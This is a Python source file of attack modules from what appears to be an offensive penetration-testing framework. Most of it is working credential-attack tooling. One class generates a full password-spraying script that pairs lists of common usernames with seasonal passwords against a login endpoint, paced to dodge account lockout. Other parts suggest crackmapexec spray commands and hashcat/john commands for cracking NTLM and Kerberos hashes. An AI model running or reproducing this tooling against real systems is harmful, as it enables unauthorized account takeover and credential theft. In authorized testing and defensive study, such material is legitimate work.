"""Attack modules: auth_creds."""

from __future__ import annotations

from tools.attack_modules.base import AttackModule, ModuleContext
import json
from typing import Any

class CredentialSpray(AttackModule):
    name = "CredentialSpray"
    description = "Password spraying against multiple services"
    target_services = ["ssh", "smb", "microsoft-ds", "http", "https", "rdp", "ms-wbt-server"]
    target_ports = [22, 445, 80, 443, 3389]
    required_cves = []

    def run(self, ctx: ModuleContext) -> dict[str, Any]:
        return {
            "status": "info",
            "module": self.name,
            "note": "Sprays common passwords against discovered services. Use with rate limiting.",
            "suggested_command": f"crackmapexec smb {ctx.target_ip} -u users.txt -p passwords.txt",
        }


# ---------------------------------------------------------------------------
# Privilege Escalation Modules
# ---------------------------------------------------------------------------

class PasswordSpray(AttackModule):
    name = "PasswordSpray"
    description = "Spray one password across many accounts to avoid lockout (spray-and-pray)"
    target_services = ["http", "https", "ssh", "smb", "microsoft-ds", "rdp", "ms-wbt-server"]
    target_ports = [80, 443, 22, 445, 3389]
    required_cves = []

    def run(self, ctx: ModuleContext) -> dict[str, Any]:
        script = self.generate_python_script(ctx)
        return {
            "status": "script_generated",
            "module": self.name,
            "script": script,
            "note": "Sprays common passwords across many usernames. Low-and-slow to avoid lockouts.",
        }

    def generate_python_script(self, ctx: ModuleContext) -> str:
        return f'''"""Password Spray Attack — one password, many users, low-and-slow."""
import concurrent.futures, json, sys, time, urllib.request, urllib.error

TARGET = sys.argv[1] if len(sys.argv) > 1 else "{ctx.target_ip}"
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 80
SCHEME = "https" if PORT in (443, 8443) else "http"
BASE = f"{{SCHEME}}://{{TARGET}}:{{PORT}}"
DELAY = 2.0  # Seconds between attempts to avoid lockout

# Common usernames (expand based on recon)
USERS = [
    "admin", "administrator", "root", "user", "test", "guest",
    "info", "support", "sales", "marketing", "hr", "finance",
    "manager", "developer", "dev", "ops", "backup", "service",
    "sa", "postgres", "mysql", "oracle", "tomcat", "jenkins",
]

# Common spray passwords (seasonal + defaults)
PASSWORDS = [
    "Password1", "Password123", "Welcome1", "Welcome123",
    "Spring2026", "Summer2026", "May2026", "April2026",
    "Changeme123", "Password@123", "Admin@123", "Company@123",
    "P@ssw0rd", "P@ssw0rd123", "Qwerty123", "Admin123!",
]

def try_login(username: str, password: str) -> dict:
    """Attempt a single login."""
    data = json.dumps({{"username": username, "password": password}}).encode()
    try:
        req = urllib.request.Request(
            f"{{BASE}}/api/login",
            data=data,
            headers={{"Content-Type": "application/json"}},
            method="POST",
        )
        with urllib.request.urlopen(req, timeout=10) as resp:
            body = resp.read(2048).decode(errors="replace")
            return {{"username": username, "password": password, "status": resp.status, "success": True, "body": body[:200]}}
    except urllib.error.HTTPError as e:
        body = e.read().decode(errors="replace")
        # 401/403 = valid user, wrong password. 200/302 = success.
        if e.code in (200, 302):
            return {{"username": username, "password": password, "status": e.code, "success": True, "body": body[:200]}}
        return {{"username": username, "password": password, "status": e.code, "success": False}}
    except Exception as e:
        return {{"username": username, "password": password, "error": str(e)}}

print(f"=== Password Spray: {{BASE}} ===\\n")
print(f"Users: {{len(USERS)}}, Passwords: {{len(PASSWORDS)}}, Delay: {{DELAY}}s\\n")

found = []
for password in PASSWORDS:
    print(f"\\n[Spray] Password: {{password}}")
    for username in USERS:
        result = try_login(username, password)
        status = result.get("status", "?")
        print(f"  {{username}}:{{password}} -> {{status}}", end="")
        if result.get("success"):
            print(" [SUCCESS!]")
            found.append(result)
        else:
            print("")
        time.sleep(DELAY)

if found:
    print(f"\\n[+] {{len(found)}} valid credentials found:")
    for f in found:
        print(f"  {{f['username']}} / {{f['password']}}")
else:
    print("\\n[-] No valid credentials found.")

print("\\n[!] For larger sprays, use crackmapexec or o365spray for O365/Azure targets.")
'''

class HashCrack(AttackModule):
    name = "HashCrack"
    description = "Wrapper around hashcat/john with rule-based mutations for captured hashes"
    target_services = ["smb", "microsoft-ds", "ssh", "http", "https"]
    target_ports = [445, 22, 80, 443]
    required_cves = []

    def run(self, ctx: ModuleContext) -> dict[str, Any]:
        return {
            "status": "info",
            "module": self.name,
            "note": "Cracks NTLM, NetNTLMv1/v2, Kerberos TGS, MD5, SHA, bcrypt, and more.",
            "suggested_commands": [
                f"hashcat -m 1000 -a 3 ntlm_hashes.txt ?l?l?l?l?l?l?l?l",
                f"hashcat -m 5600 -a 0 netntlmv2_hashes.txt rockyou.txt -r best64.rule",
                f"john --wordlist=rockyou.txt --rules hashes.txt",
            ],
            "hash_modes": {
                "0": "MD5",
                "1000": "NTLM",
                "13100": "Kerberos 5 TGS-REP etype 23",
                "5600": "NetNTLMv2",
                "18200": "Kerberos 5 AS-REP etype 23",
                "3200": "bcrypt",
            },
        }

